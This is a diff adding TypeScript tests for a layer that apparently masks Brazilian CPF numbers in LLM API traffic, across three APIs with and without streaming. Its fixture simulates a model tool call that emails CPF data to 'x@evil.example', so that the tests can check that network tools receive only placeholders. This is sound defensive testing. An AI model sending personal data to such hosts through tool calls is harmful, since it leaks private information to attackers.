@@ -145,3 +145,56 @@ test("AI SDK: streamText com marcador cortado", async () => {
   for await (const delta of result.textStream) text += delta;
   assert.equal(text, `Oi Maria Souza, CPF ${CPF}`);
 });
+
+// Ferramentas de rede não recebem dados reais; write_file (controle) recebe. Três APIs, com e sem streaming.
+const ARGS = JSON.stringify({ para: "x@evil.example", texto: "CPF [CPF_1]" });
+const PEDACOS = ARGS.match(/.{1,6}/gs) ?? [];
+const ev = (nome: string | null, dados: unknown) => `${nome ? `event: ${nome}\n` : ""}data: ${JSON.stringify(dados)}\n\n`;
+
+function respostaComFerramenta(api: string, stream: boolean, ferramenta: string) {
+  if (api === "chat") {
+    if (!stream) return json({ choices: [{ index: 0, message: { tool_calls: [{ id: "1", type: "function", function: { name: ferramenta, arguments: ARGS } }] } }] });
+    return sse([
+      ev(null, { choices: [{ index: 0, delta: { tool_calls: [{ index: 0, id: "1", type: "function", function: { name: ferramenta, arguments: "" } }] } }] }),
+      ...PEDACOS.map((p) => ev(null, { choices: [{ index: 0, delta: { tool_calls: [{ index: 0, function: { arguments: p } }] } }] })),
+      ev(null, { choices: [{ index: 0, delta: {}, finish_reason: "tool_calls" }] }), "data: [DONE]\n\n",
+    ]);
+  }
+  if (api === "anthropic") {
+    if (!stream) return json({ type: "message", content: [{ type: "tool_use", id: "1", name: ferramenta, input: JSON.parse(ARGS) }] });
+    return sse([
+      ev("content_block_start", { type: "content_block_start", index: 0, content_block: { type: "tool_use", id: "1", name: ferramenta, input: {} } }),
+      ...PEDACOS.map((p) => ev("content_block_delta", { type: "content_block_delta", index: 0, delta: { type: "input_json_delta", partial_json: p } })),
+      ev("content_block_stop", { type: "content_block_stop", index: 0 }), ev("message_stop", { type: "message_stop" }),
+    ]);
+  }
+  const item = { type: "function_call", id: "fc_1", call_id: "c1", name: ferramenta, arguments: ARGS };
+  if (!stream) return json({ object: "response", output: [item] });
+  return sse([
+    ev("response.output_item.added", { type: "response.output_item.added", output_index: 0, item: { ...item, arguments: "" } }),
+    ...PEDACOS.map((p) => ev("response.function_call_arguments.delta", { type: "response.function_call_arguments.delta", output_index: 0, delta: p })),
+    ev("response.function_call_arguments.done", { type: "response.function_call_arguments.done", output_index: 0, arguments: ARGS }),
+  ]);
+}
+
+for (const api of ["chat", "responses", "anthropic"]) {
+  for (const stream of [false, true]) {
+    test(`ferramentas de rede não recebem dados reais (${api}${stream ? ", streaming" : ""})`, async () => {
+      const caminho = { chat: "/v1/chat/completions", responses: "/v1/responses", anthropic: "/v1/messages" }[api];
+      const corpo = api === "responses"
+        ? { model: "m", stream, input: `Meu CPF é ${CPF}` }
+        : { model: "m", stream, max_tokens: 10, messages: [{ role: "user", content: `Meu CPF é ${CPF}` }] };
+      const textos: Record<string, string> = {};
+      for (const ferramenta of ["send_email", "write_file"]) {
+        const server = fakeServer(() => respostaComFerramenta(api, stream, ferramenta));
+        const resposta = await createFetch({ fetch: server.fetch })(`https://api.example${caminho}`, {
+          method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify(corpo),
+        });
+        textos[ferramenta] = await resposta.text();
+        assert.ok(!server.sent[0].includes(CPF));
+      }
+      assert.ok(!textos.send_email.includes(CPF) && textos.send_email.includes("[CPF_1]"), textos.send_email);
+      assert.ok(textos.write_file.includes(CPF), textos.write_file);
+    });
+  }
+}
